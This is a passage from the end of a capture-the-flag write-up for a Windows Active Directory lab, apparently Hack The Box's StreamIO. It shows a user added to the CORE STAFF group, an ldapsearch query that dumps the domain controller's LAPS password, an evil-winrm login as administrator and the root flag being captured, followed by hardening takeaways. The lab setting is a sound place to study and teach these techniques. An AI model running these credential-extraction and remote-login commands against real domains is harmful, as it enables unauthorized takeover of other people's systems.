Account active               Yes
Account expires              Never

Password last set            2/22/2022 1:56:42 AM
Password expires             Never
Password changeable          2/23/2022 1:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/27/2025 7:47:02 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
The command completed successfully.

*Evil-WinRM* PS C:\users\nikk37\Documents>

```
**Findings:** `JDgodd` was successfully added to the `CORE STAFF` group.



### Phase 9: LAPS Password Retrieval

**30. LDAP Query for LAPS**  
An LDAP query was performed to retrieve the LAPS password for the domain controller.
```bash
❯ ldapsearch -H ldap://10.129.20.200 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w '<REDACTED_PASSWORD>' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: <REDACTED_PASSWORD> 

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

 /home/honeypoop/Desktop/Tools    
```

**Findings:** The LAPS password for the domain controller was retrieved: `<REDACTED_LAPS_PASSWORD>`.

### Phase 10: Domain Administrator Access

**31. Administrator Access**  
The LAPS password was used to authenticate as the local administrator.

**32. Root Flag Retrieval**  
With administrative access, the root flag was retrieved.
```bash 
evil-winrm -u administrator -p '<REDACTED_LAPS_PASSWORD>' -i 10.129.20.200


cd De*Evil-WinRM* PS C:\Users\Martin> cd Desktop
*Evil-WinRM* PS C:\Users\Martin\Desktop> ls


    Directory: C:\Users\Martin\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/27/2025   5:28 AM             34 root.txt

PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Martin\Desktop> clear
*Evil-WinRM* PS C:\Users\Martin\Desktop> cat root.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\Martin\Desktop>
```
**Findings:** The root flag was successfully retrieved: `<REDACTED_ROOT_FLAG>`

## Key Takeaways

- **Subdomain Enumeration:** Always enumerate subdomains as they often host additional applications with vulnerabilities.
    
- **SQL Injection Prevention:** Implement parameterized queries and input validation to prevent SQL injection attacks.
    
- **Secure File Inclusion:** Disable remote file inclusion and validate all file paths to prevent LFI/RFI vulnerabilities.
    
- **Credential Management:** Avoid storing credentials in source code and use secure credential management solutions.
    
- **Browser Security:** Educate users about the risks of saving passwords in browsers and implement appropriate group policies.
    
- **Active Directory Hardening:** Regularly audit group memberships and remove unnecessary privileges to prevent privilege escalation.
    
- **LAPS Security:** Ensure LAPS passwords are only accessible to authorized users and monitor for unauthorized access attempts.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
